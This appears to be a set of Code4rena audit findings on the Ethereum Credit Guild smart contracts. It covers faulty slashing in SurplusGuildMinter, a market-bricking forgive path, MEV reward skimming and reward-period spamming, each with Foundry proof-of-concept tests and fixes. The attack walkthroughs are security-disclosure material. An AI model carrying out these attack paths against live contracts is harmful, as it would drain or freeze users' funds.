 # [HIGH-1] Users staking via the SurplusGuildMinter can be immediately slashed when staking into a gauge that had previously incurred a loss
  
 # Lines of code
 https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/loan/SurplusGuildMinter.sol#L228-L231
 
 ## Impact
 All users that stake after the first loss that has been registered in the protocol will lose all their stakes, because they will always be considered slashed
 
 ## Vulnerability details
 In the `getRewards()` function the following check is made before anything else
 
 ```solidity
 lastGaugeLoss = GuildToken(guild).lastGaugeLoss(term);
 if (lastGaugeLoss > uint256(userStake.lastGaugeLoss)) {
     slashed = true;
 }
 ```
 
 The problem is that userStake is loaded after that check, which means that in the check itself all members of the `userStake` struct will have their default values. This means `userStake.lastGaugeLoss==0` . If there are no losses in the system everything is fine, because `lastGaugeLoss` will also be 0 and the check will evaluate to false.
 
 The problem introduces itself the first time a loss occurs in the system. This will set `lastGaugeLoss` to a value greater than 0 (the timestamp when loss was registered). And since `userStake.lastGaugeLoss` is always 0 (default value) the check will evaluate to true for all future stakes/unstakes (which call `getRewards` ):
 
 ```solidity
 function getRewards(
         address user,
         address term
     )
         public
         returns (
             uint256 lastGaugeLoss, // GuildToken.lastGaugeLoss(term)
             UserStake memory userStake, // stake state after execution of getRewards()
             bool slashed // true if the user has been slashed
         )
     {
         bool updateState;
         lastGaugeLoss = GuildToken(guild).lastGaugeLoss(term);
         //@audit - ::VALID evaluating userStake before getting it from storage
         // lastGaugeLoss -> defaults to 0
         if (lastGaugeLoss > uint256(userStake.lastGaugeLoss)) {
             slashed = true;
         }
 				
 				
 	//@audit - user stake is loaded from storage after check
 	// if the user is not staking, do nothing
         userStake = _stakes[user][term];
 			......
 }
 ```
 
 ## Proof of Concept
 * Alice stakes 100e18 gTokens
 * loss is incured and `pnl` applied and stakes are slashed
 * Alice unstakes
 * Bob stakes 100e18 gTokens for the first time after the last loss was incurred
 * Bob attempts to unstake, but is also slashed due to wrong input validation
 * Every other subsequent staker will loose their stakes provided at least one loss has been incurred in the past.
 
 Add the following test case to the `SurplusGuildMinterUnitTest` and run `forge test --match-test testStakesLostAfterFirstLoss -vv`
 
 ```solidity
 function testStakesLostAfterFirstLoss() public {
         address alice = makeAddr("alice");
        address bob = makeAddr("bob");
 
         // 1.  mint bob & alice 100 CREDIT
         credit.mint(alice, 100e18);
         credit.mint(bob, 100e18);
 
         // variable to store stake info
         SurplusGuildMinter.UserStake memory userStake;
 
         // 2. Alice stakes 100 CREDIT => gets x2 GUILD tokens
         vm.startPrank(alice);
         credit.approve(address(sgm), 100e18);
         sgm.stake(term, 100e18);
         vm.stopPrank();
 
         // alice stake successful
         userStake = sgm.getUserStake(alice, term);
         assertEq(userStake.stakeTime, block.timestamp);
         assertEq(userStake.credit, 100e18);
         assertEq(userStake.guild, 2 * 100e18);
 
         // time passes
         vm.warp(block.timestamp + 13);
         vm.roll(block.number + 1);
 
         // 3. Apply loss
         profitManager.notifyPnL(term, -0.5e18);
         guild.applyGaugeLoss(term, address(sgm));
 
         // 4. Alice unstakes
         vm.startPrank(alice);
         sgm.unstake(term, 123);
 
         // alice stake is slashed
         userStake = sgm.getUserStake(alice, term);
         assertEq(userStake.credit, 0);
         assertEq(userStake.guild, 0);
 
         //because of slashing - nothing is left
         assertEq(credit.balanceOf(address(alice)), 0);
         assertEq(guild.balanceOf(address(sgm)), 0);
 
         // time passes
         vm.warp(block.timestamp + 13);
         vm.roll(block.number + 1);
 
         // 5.Innocent new user Bob stakes
         vm.startPrank(bob);
         credit.approve(address(sgm), 100e18);
         sgm.stake(term, 100e18);
 
         // bob stake successful
         userStake = sgm.getUserStake(bob, term);
         assertEq(userStake.stakeTime, block.timestamp);
         assertEq(userStake.credit, 100e18);
         assertEq(userStake.guild, 2 * 100e18);
 
         // some time passes
         vm.warp(block.timestamp + 13);
         vm.roll(block.number + 1);
 
         // 5.Bob unstakes
         sgm.unstake(term, 123);
 
         // Bob stake was nullified because he is falsley marked as slashed
         userStake = sgm.getUserStake(bob, term);
         assertEq(userStake.stakeTime, 0);
         assertEq(userStake.credit, 0);
         assertEq(userStake.guild, 0);
 
         assertEq(credit.balanceOf(address(bob)), 0);
         // no actual slashing occured
         assertEq(guild.balanceOf(address(sgm)), 2 * 100e18);
     }
 ```
 
 ## Tools Used
 Foundry
 
 ## Recommended Mitigation Steps
 * Loading `userStake` should be the first step in the function, so that the subsequent check uses the actual stored values for that user and not the default ones
 * Also add a check to ensure that the user staked before the gauge was slashed (`lastGaugeLoss > userStake.stakeTime`)
 
 ```solidity
 function getRewards(
         address user,
         address term
     )
         public
         returns (
             uint256 lastGaugeLoss, // GuildToken.lastGaugeLoss(term)
             UserStake memory userStake, // stake state after execution of getRewards()
             bool slashed // true if the user has been slashed
         )
     {
 
 >+	userStake = _stakes[user][term]; <---------- //FIRST LOAD userStake
 
         bool updateState;
         lastGaugeLoss = GuildToken(guild).lastGaugeLoss(term);
            
            // check if the user staked before or after the slashing
 >+        if (lastGaugeLoss > uint256(userStake.lastGaugeLoss) & lastGaugeLoss > userStake.stakeTime) {
             slashed = true;
         }
 
         // if the user is not staking, do nothing
  >-       userStake = _stakes[user][term]; <---------- //REMOVE FROM HERE
 }
 ```
 
 ## Assessed type
 Invalid Validation


# [MEDIUM-1] If the first loan of a market is forgiven, the whole market will be permanently bricked

 # Lines of code
 https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/loan/AuctionHouse.sol#L214-L219 https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/loan/LendingTerm.sol#L789-L797 https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/ProfitManager.sol#L331-L338
 
 ## Vulnerability details
 In a newly deployed market with only a single borrowed loan if that loan is forgiven, this will reduce the `creditMultiplier` to 0. This is an essential parameter in the protocol, used for calculating the rate of issuance of credit tokens. It is used in almost all of the contracts in a market. So compromising this variable leads to the whole market being inoperable.
 
 Since the multiplier only goes down and there is no way to manage its value, nothing can be done to fix a bricked market.
 
 Below is a snapshot of `ProfitManager.notifyPnL()` where `creditMultiplier` gets decremented when loss occurs
 
 ```solidity
 function notifyPnL(
         address gauge,
         int256 amount
     ) external onlyCoreRole(CoreRoles.GAUGE_PNL_NOTIFIER) {
 		....
 		
 		uint256 newCreditMultiplier = (creditMultiplier *
                     (creditTotalSupply - loss)) / creditTotalSupply;
                 creditMultiplier = newCreditMultiplier;
 
 		....
 }
 ```
 
 One of the cases when the above function gets called with loss is when the following flow is executed `AuctionHouse.forgive` → `LendingTerm.onBid`
 
 ```solidity
 function onBid(
         bytes32 loanId,
         address bidder,
         uint256 collateralToBorrower,
         uint256 collateralToBidder,
         uint256 creditFromBidder
     ) external {
 		.....
 		
 	// handle profit & losses
         if (pnl != 0) {
             // forward profit, if any
             if (interest != 0) {
                 CreditToken(refs.creditToken).transfer(
                     refs.profitManager,
                     interest
                 );
             }
             ProfitManager(refs.profitManager).notifyPnL(address(this), pnl);
         }
 
              ....
 }
 ```
 
 ## Impact
 Deployed market becomes permanently bricked, without any available mechanism to fix it.
 
 ## Proof of Concept
 A POC added to `LendingTerm.t.sol` . It demonstrates how all vital contracts of a market can be disabled.
 
 Summary of the POC:
 
 * User borrows loan in a market with partial repay period of 30 days
 * User misses a payment → loan becomes callable
 * Loan is called and send to auction
 * During the auction, no one buys the loan
 * The user forgives his loan
 * Since this was the only loan, multiplier is reduced to 0
 * System becomes dysfunctional
 
 ```solidity
 function testReduceMultiplyerToZero() public {
         // borrow
         uint256 borrowAmount = 20_000e18;
         uint256 collateralAmount = 15e18;
         collateral.mint(address(this), collateralAmount * 10);
         collateral.approve(address(term), collateral.balanceOf(address(this)));
         bytes32 loanId = term.borrow(borrowAmount, collateralAmount);
 
         // not paying on time
         vm.warp(block.timestamp + _MAX_DELAY_BETWEEN_PARTIAL_REPAY + 1);
         vm.roll(block.number + 1);
 
         //bidder calls the loan
         address bidder = address(10);
         vm.startPrank(bidder);
         term.call(loanId);
         assertEq(term.getLoan(loanId).callTime, block.timestamp);
 
         // auction passes, without anyone buying the loan
         vm.warp(block.timestamp + auctionHouse.auctionDuration());
         vm.roll(block.number + 1);
 
         assertEq(profitManager.creditMultiplier(), 1e18);
 
         // Debt is forgiven
         auctionHouse.forgive(loanId);
         vm.stopPrank();
         assertEq(auctionHouse.getAuction(loanId).endTime, block.timestamp);
 
         // Credit multiplier is reduced to 0
         assertEq(profitManager.creditMultiplier(), 0);
 
         // Borrow is not working anymore
         vm.expectRevert(); // throws "Division or modulo by 0"
         term.borrow(borrowAmount, collateralAmount);
 
         // notifyPnL is broken
         credit.mint(address(this), 1);
         vm.prank(address(term));
         vm.expectRevert();
         profitManager.notifyPnL(address(term), int256(1));
 
         // PSM contract is also broken
         vm.expectRevert(); // throws "Division or modulo by 0"
         psm.mint(address(this), 1);
     }
 ```
 
 The above is only an example scenario that could lead to the above situation. The exploit occurs when the following conditions are present:
 
 * It is a market with no other loans in it
   
   * Most probably because it is a new market
   * Or probably lenders stopped providing liquidity, leaving the current market empty
 * Loan becomes insolvent
   
   * Repayment is not made on time
   * Gauge becomes deprecated
 * Loan is not liquidated during the action phase
   
   * No interest in the particular collateral(maybe price dropped)
   * Or currently there are no active bidders for that market
 * Loan is forgiven - multiplier is reduced to 0
 
 It is completely possible that a malicious user can monitor for new/empty markets, especially for such that have short `_MAX_DELAY_BETWEEN_PARTIAL_REPAY` periods (so that their loan can become insolvent fast), then call that loan themselves, wait for auction period to pass (because market is very new and does not have activity yet) and then call `forgive`.
 
 The affected contracts are:
 
 * `ProfitManager`
 * `LendingTerm`
 * `SimplePSM`
 * `AuctionHouse`
 
 ## Tools Used
 Foundry, Manual review
 
 ## Recommended Mitigation Steps
 Making actual deposits in every new market, especially when the protocol switches to fully decentralized, self-governing mode is quite tedious, pricey and not quite elegant approach.
 
 A better one would be to configure an amount of `CREDIT` that would be automatically minted upon deployment of a market(maybe to address(0)). The idea is that those tokens will not be burned and will always stay in supply, so that the multiplier cannot be reduced to 0
 
 ## Assessed type
 Other

 # [MEDIUM-2] Malicious borrower can decrease Guild holders reward

 # Lines of code
 https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/ProfitManager.sol#L292
 
 ## Vulnerability details
 An attacker can use MEV (via gas auction or Flashbots or control of miners) to cause an unfair division of rewards. By providing a large (relative to the size of all other staked tokens) credit token deposit Just-in-Time before a `GAUGE_PNL_NOTIFIER` call to `ProfitManager.notifyPnL` the `CREDIT` deposited by the attacker will receive a big portion of the rewards and the attacker can immediately withdraw their deposit after rewards are distributed.
 
 We assume this allows an attacker to get a lot of the rewards (in GUILD and CREDIT) even though they haven't provided any deposit that has been borrowed.
 
 ## Impact
 Credit holders get rewards, they have not earned
 
 ## Proof of Concept
 1. An attacker watches the mempool for calls to `ProfitManager.notifyPnL` by the `GAUGE_PNL_NOTIFIER role`.
 2. The attacker orders the block's transactions (most easily using a flashbots bundle) in the following order:
    
    1. Attacker deposits assets to lend (ideally the pool will be the one with the least volume).
    2. `GAUGE_PNL_NOTIFIER`  call to `ProfitManager.notifyPnL` happens
    3. Attacker withdraws their deposit.
 
 ## Tools Used
 Manual review
 
 ## Recommended Mitigation Steps
 A good mitigation approach could use something like snapshotting who has deposited since the last reward distribution and only give these depositors rewards based on the size of their deposits the next time yield is distributed.
 
 ## Assessed type
 MEV

# [MEDIUM-3] Anyone can prolong the time for the rewards to get distributed

 # Lines of code
 https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/tokens/ERC20RebaseDistributor.sol#L338-L386 https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/tokens/ERC20RebaseDistributor.sol#L339
 
 ## Vulnerability Details
 The `distribute(...)` function is used to distribute tokens proportionately to all rebasing accounts.
 
 Each time `distribute(...)` is called, the distribution `targetTimestamp` is updated and extended by the `DISTRIBUTION_PERIOD`.
 
 The problem lies in the fact that the `distribute(...)` only implements check to ensure that the amount being distributed is not 0. An attacker can call the `distribute(...)` function with `1 wei` every hour in 24 hours, thereby extending the rewards distribution `targetTimestamp` for each call.
 
 The attack path is cheap as it only requires the attacker to pay for gas.
 
 POC Summary
 
 * Alice and Bob each `enterRebase(...)` with 100e18 tokens
 * Bobby calls `distribute(...)` with 150e18 tokens
 * Under normal circumstance, at the end of the distribution period (30 days), Alice and Bob should both have 175e18 each.
 * An attacker (`evil`) however starts to call `distribute(...)`  with `1 wei`, every 1 hour for the next 30 days
 * At the end of 30 days, Alice and Bob have each has received 147e18 tokens from distribution,
 * If the both exit rebase immediately after the 30 days, they loose about 23e18.
 
 The attacker can reduce the timing and from 1 hour and further extent the distribution time further.
 
 ```solidity
 function distribute(uint256 amount) external {
         require(amount != 0, "ERC20RebaseDistributor: cannot distribute zero");
 
         ...
 
         // adjust up the balance of all accounts that are rebasing by increasing
         // the share price of rebasing tokens
         if (_rebasingSupply != 0) {
             // update rebasingSharePrice interpolation
             // @audit call this every hour for 24 hours you would have pushed this by about 
             uint256 endTimestamp = block.timestamp + DISTRIBUTION_PERIOD;
             uint256 newTargetSharePrice = (amount *  START_REBASING_SHARE_PRICE + __rebasingSharePrice.targetValue * _totalRebasingShares) / _totalRebasingShares;
             __rebasingSharePrice = InterpolatedValue({
                 lastTimestamp: SafeCastLib.safeCastTo32(block.timestamp),
                 lastValue: SafeCastLib.safeCastTo224(_rebasingSharePrice),
                 targetTimestamp: SafeCastLib.safeCastTo32(endTimestamp),
                 targetValue: SafeCastLib.safeCastTo224(newTargetSharePrice)
             });
 
             // update unmintedRebaseRewards interpolation
             uint256 _unmintedRebaseRewards = unmintedRebaseRewards();
             __unmintedRebaseRewards = InterpolatedValue({
                 lastTimestamp: SafeCastLib.safeCastTo32(block.timestamp),
                 lastValue: SafeCastLib.safeCastTo224(_unmintedRebaseRewards),
                 targetTimestamp: SafeCastLib.safeCastTo32(endTimestamp),
                 targetValue: __unmintedRebaseRewards.targetValue +
                     SafeCastLib.safeCastTo224(amount)
             });
         }
     }
 ```
 
 ## POC
 Here we write two tests for you to see the impact of the vulnerabilty
 
 * first to show normal distribution and
 * second to show the effect of spammed distribution
 
 Add the test cases to the to the `ERC20RebaseDistributor.t.sol` file and
 
 * run `forge test --match-test testBrickedEnterRebase -vv`
 * run `forge test --match-test testNormalEnterRebase -vv`
 
 ## attack CASE
 Under attack run `forge test --match-test testBrickedEnterRebase -vv`
 
 ```solidity
 function testBrickedEnterRebase() public {
         address evil = makeAddr("evil");
         address bob = makeAddr("bob");
 
         token.mint(bobby, 1500e18);
         token.mint(alice, 100e18);
         token.mint(bob, 100e18);
         token.mint(evil, 1e18);
 				
         //alice enters rebase
         vm.prank(alice);
         token.enterRebase();
 				
         //bob enters rebase
         vm.prank(bob);
         token.enterRebase();
 
         // add 150 tokens to distribute as rewards
         vm.prank(bobby);
         token.distribute(150e18);
 
         vm.startPrank(evil);
 
         uint256 curBlock = 1679067867;
 				
         // // callin gdistribute every 1 hour with 1 wei
         uint interval = 1 hours;
         
         emit log_named_decimal_uint("Alice Balance at the begining 30 days-->", token.balanceOf(alice), 18);
         emit log_named_decimal_uint("Bob Balance at the begining 30 days-->", token.balanceOf(bob), 18);
 
         for (uint i = 0; i < (30 days / interval); i++) {
             curBlock += interval;
             vm.warp(curBlock);
 						
 						// this resets the distribution time(30 days) on every call
             token.distribute(1);
             
         }
         
 
         emit log_named_decimal_uint("Alice Balance After 30 days-->", token.balanceOf(alice), 18);
         emit log_named_decimal_uint("Bob Balance After 30 days-->", token.balanceOf(bob), 18);
     }
 ```
 
 ## normal CASE
 Under normal circumstances, run `forge test --match-test testNormalEnterRebase -vv`
 
 ```solidity
 function testNormalEnterRebase() public {
         address evil = makeAddr("evil");
         address bob = makeAddr("bob");
 
         token.mint(bobby, 1500e18);
         token.mint(alice, 100e18);
         token.mint(bob, 100e18);
         token.mint(evil, 1e18);
 				
         //alice enters rebase
         vm.prank(alice);
         token.enterRebase();
 				
         //bob enters rebase
         vm.prank(bob);
         token.enterRebase();
 
         // add 150 tokens to distribute as rewards
         vm.prank(bobby);
         token.distribute(150e18);
 
         vm.startPrank(evil);
 
         uint256 curBlock = 1679067867;
 				
         
         emit log_named_decimal_uint("Alice Balance at the begining 30 days-->", token.balanceOf(alice), 18);
         emit log_named_decimal_uint("Bob Balance at the begining 30 days-->", token.balanceOf(bob), 18);
 
         vm.warp(curBlock + 30 days);
 
         emit log_named_decimal_uint("Alice Balance After 30 days-->", token.balanceOf(alice), 18);
         emit log_named_decimal_uint("Bob Balance After 30 days-->", token.balanceOf(bob), 18);
     }
 ```
 
 ## TOOLs USED
 Foundry
 
 ## RECOMMENDATION
 Increase the minimum amount of tokens that can be distributed thereby making the attack path expensive.
 
 ## Assessed type
 Other